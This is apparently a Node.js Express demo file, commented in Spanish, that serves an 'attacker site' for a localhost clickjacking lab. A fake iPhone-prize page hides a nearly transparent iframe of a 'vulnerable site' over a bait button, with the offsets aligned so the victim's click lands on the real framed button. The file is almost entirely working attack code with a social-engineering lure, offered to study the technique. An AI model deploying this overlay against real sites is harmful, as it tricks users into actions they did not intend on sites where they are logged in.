const express = require('express');
const app = express();
const port = 3003; // Puerto para el sitio atacante

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="es">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Sitio Atacante - ¡Gana un iPhone!</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          height: 100vh;
          margin: 0;
          background-color: #e0f7fa; /* Un color de fondo atractivo */
          color: #004d40;
          text-align: center;
        }
        h1 {
          color: #00796b;
          margin-bottom: 20px;
        }
        p {
          margin-bottom: 30px;
          font-size: 1.1em;
        }
        .clickjacking-area {
          position: relative;
          width: 400px; /* Ajusta el tamaño para que el iframe quepa */
          height: 200px;
          overflow: hidden;
          border: 2px dashed #00796b;
          margin-top: 30px;
        }
        iframe {
          position: absolute;
          /* Ajusta estos valores para alinear el botón del iframe con el botón falso */
          /* top: (altura_iframe / 2) - (altura_area_visible / 2) */
          /* left: (ancho_iframe / 2) - (ancho_area_visible / 2) */
          top: -147px; /* Ajustado: (400/2) - (200/2) = 200 - 100 = 100. Negativo para mover hacia arriba */
          left: -92px; /* Ajustado: (600/2) - (400/2) = 300 - 200 = 100. Negativo para mover hacia la izquierda */
          width: 600px; /* Más grande que el área visible para ocultar bordes */
          height: 400px;
          opacity: 0.0001; /* Casi invisible */
          filter: alpha(opacity=0.01); /* Para IE */
          z-index: 1000; /* Asegura que esté por encima de otros elementos */
          border: none;
        }
        .fake-button {
          background-color: #ff9800; /* Un botón falso llamativo */
          color: white;
          padding: 15px 30px;
          font-size: 24px;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          z-index: 1; /* Asegura que esté debajo del iframe invisible */
        }
      </style>
    </head>
    <body>
      <h1>¡Felicidades! Has sido seleccionado para ganar un iPhone.</h1>
      <p>Haz clic en el botón de abajo para participar en el sorteo.</p>
      <div class="clickjacking-area">
        <iframe src="http://localhost:3002/" title="Sitio Vulnerable"></iframe>
        <button class="fake-button">¡Haz clic aquí para ganar!</button>
      </div>
      <p style="margin-top: 50px; font-size: 0.9em; color: #666;">Este es un ejemplo de Clickjacking. El botón de arriba es un botón falso que oculta un botón real de otro sitio.</p>
    </body>
    </html>
  `);
});

app.listen(port, () => {
  console.log(`Sitio Atacante ejecutándose en http://localhost:${port}`);
});